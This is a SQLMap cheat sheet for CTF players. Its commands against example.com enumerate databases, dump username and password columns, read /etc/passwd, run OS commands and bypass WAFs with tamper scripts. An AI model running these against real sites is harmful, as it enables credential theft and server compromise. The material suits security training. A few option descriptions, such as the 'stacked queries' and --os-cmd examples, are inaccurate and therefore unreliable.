---
icon: database
---

# SQLNAP CookBook

### The SQLMap Masterclass: Conquer SQL Injection Vulnerabilities

SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities. It's a must-have for any CTF player. This manual will guide you through SQLMap's capabilities, from basic usage to advanced techniques.

**I. Core Concepts:**

* **SQL Injection:** A vulnerability that allows attackers to inject malicious SQL code into a web application, potentially gaining access to the database.
* **Target:** The URL or web application endpoint that you want to test for SQL injection.
* **Database Management System (DBMS):** The type of database used by the web application (e.g., MySQL, PostgreSQL, Microsoft SQL Server).
* **Authentication:** Credentials needed to access the database.
* **Data Retrieval:** Extracting data from the database.

**II. Basic Usage:**

1.  **Basic URL Test:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1"
    ```

    Tests the URL for SQL injection vulnerabilities.
2.  **Specifying the DBMS:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --dbms=mysql
    ```

    Specifies that the DBMS is MySQL (useful if automatic detection fails).
3.  **Listing Databases:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --dbs
    ```

    Enumerates the databases.
4.  **Listing Tables:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" -D "database_name" --tables
    ```

    Enumerates the tables in the specified database.
5.  **Listing Columns:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" -D "database_name" -T "table_name" --columns
    ```

    Enumerates the columns in the specified table.
6.  **Dumping Data:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" -D "database_name" -T "table_name" -C "column1,column2" --dump
    ```

    Dumps the data from the specified columns.

**III. Advanced Options:**

1.  **Setting the HTTP Method:**

    ```bash
    sqlmap -u "http://example.com/page.php" --method=POST --data="id=1"
    ```

    Specifies the HTTP method (e.g., POST) and data.
2.  **Using a Proxy:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
    ```
3.  **Setting the User-Agent:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --user-agent="My-Custom-Agent"
    ```
4.  **Handling Cookies:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --cookie="cookie1=value1; cookie2=value2"
    ```
5.  **Authentication:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --auth-type=basic --auth-cred="user:password"
    ```
6.  **Time-Based Blind Injection:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --time-sec=5
    ```

    Specifies a time delay for blind injection.
7.  **Boolean-Based Blind Injection:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --technique=B
    ```
8.  **Union Query Injection:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --technique=U
    ```
9.  **Stacked Queries:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --sql-query="SELECT @@version"
    ```
10. **File System Access:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"
    ```

    Reads a file from the server's file system (if the database user has privileges).
11. **Operating System Command Execution:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --os-cmd
    ```

    Executes operating system commands (if the database user has privileges).
12. **Tamper Scripts:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --tamper=apostrophemask,randomcase
    ```

    Uses tamper scripts to bypass web application firewalls (WAFs).

**IV. Common Scenarios and Examples:**

1.  **Blind SQL Injection:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --technique=B --dbs  # Boolean-based blind injection
    sqlmap -u "http://example.com/page.php?id=1" --technique=T --dbs  # Time-based blind injection
    ```
2.  **Union-Based SQL Injection:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --technique=U --dbs
    ```
3.  **Error-Based SQL Injection:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --technique=E --dbs
    ```
4.  **Extracting Data from a Specific Table:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" -D "database_name" -T "users" -C "username,password" --dump
    ```
5.  **Bypassing WAFs:**

    ```bash
    sqlmap -u "http://example.com/page.php?id=1" --tamper=apostrophemask,randomcase --dbs
    ```

**V. Tips for CTFs:**

* **Be Patient:** SQLMap can take time, especially for blind injection.
* **Use the Right Technique:** Choose the appropriate injection technique (B, T, U, E, etc.) based on the application's behavior.
* **Try Different Tamper Scripts:** WAFs can be tricky. Experiment with different tamper scripts to find one that works.
* **Read the Documentation:** SQLMap has a lot of options. Refer to the documentation (`sqlmap -h` or `sqlmap --help`) for more details.
* **Combine with Other Tools:** Use SQLMap in conjunction with other tools like Burp Suite for a more comprehensive approach.
* **Practice:** The more you use SQLMap, the more comfortable you'll become with its features.
